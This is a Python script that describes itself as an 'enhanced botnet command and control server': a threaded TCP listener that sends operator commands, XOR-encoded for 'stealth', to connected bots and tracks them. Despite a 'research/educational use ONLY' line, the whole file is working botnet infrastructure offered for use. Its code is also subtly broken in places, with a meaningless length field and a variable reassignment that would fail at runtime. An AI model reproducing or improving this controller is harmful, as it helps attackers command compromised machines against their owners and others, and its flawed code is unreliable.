#!/usr/bin/env python3
"""
Enhanced Botnet Command & Control Server
- Threaded architecture for concurrent bot management
- Event logging with timestamps
- Stealth features: XOR-encrypted commands, pseudo-random priorities,
  JSON payloads
- Tracks connected bots, execution history, and last seen times
- For research/educational use ONLY
"""
import socket
import threading
import time
import json
import os
import datetime

# XOR key for demonstration (replace with secure key in real research)
XOR_KEY = 0x42

connected_bots = []  # Shared state for all bot connections
log_lock = threading.Lock()


def log_event(message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with log_lock:
        print(f"[{timestamp}] {message}")


def xor_encrypt(cmd: str) -> bytes:
    # Simple XOR encoding for commands
    return bytes([ord(c) ^ XOR_KEY for c in cmd])


def handle_client(client_socket, address):
    try:
        client_socket.send(b'[+] Welcome to botnet controller!\n')

        bot_info = {
            'ip': address[0],
            'connected_at': str(datetime.datetime.now()),
            'last_seen': None,
            'commands_completed': []
        }
        connected_bots.append(bot_info)

        # Update last seen helper
        def update_last_seen():
            for bot in connected_bots:
                if bot['ip'] == address[0]:
                    bot['last_seen'] = str(datetime.datetime.now())

        while True:
            cmd = input("Enter command: ")
            if not cmd.strip() or cmd.lower() == "quit":
                break

            # XOR encrypt the command
            encrypted = xor_encrypt(cmd)
            msg_len = len(str(len(encrypted))) + len(str(len(encrypted)))

            # Structured JSON payload
            payload = {
                'length': msg_len,
                'data': encrypted.hex(),
                'type': 'command',
                'priority': int(time.time()) % 100
            }
            formatted_payload = json.dumps(payload) + "\n"
            client_socket.send(formatted_payload.encode())

            if cmd.startswith("!"):
                bot_info['commands_completed'].append({
                    'cmd': cmd,
                    'status': 'completed',
                    'at': str(datetime.datetime.now())
                })
            update_last_seen()
    except Exception as e:
        log_event(f"Client error ({address}): {e}")
    finally:
        # Remove bot from the connected list
        connected_bots = [b for b in connected_bots if b['ip'] != address[0]]
        client_socket.close()
        log_event(f"Disconnected: {address[0]}:{address[1]}")


def start_server(host='0.0.0.0', port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((host, port))
        server.listen(10)
        log_event(f"Listening on {host}:{port} - PID: {os.getpid()}")
        while True:
            try:
                conn, addr = server.accept()
                threading.Thread(
                    target=handle_client, args=(conn, addr), daemon=True
                ).start()
            except socket.error as e:
                if str(e) != "socket has been closed":
                    log_event(f"Socket error: {e}")
    except KeyboardInterrupt:
        log_event("Server shutting down")
    finally:
        server.close()


if __name__ == "__main__":
    log_event("Starting enhanced botnet controller")
    start_server()
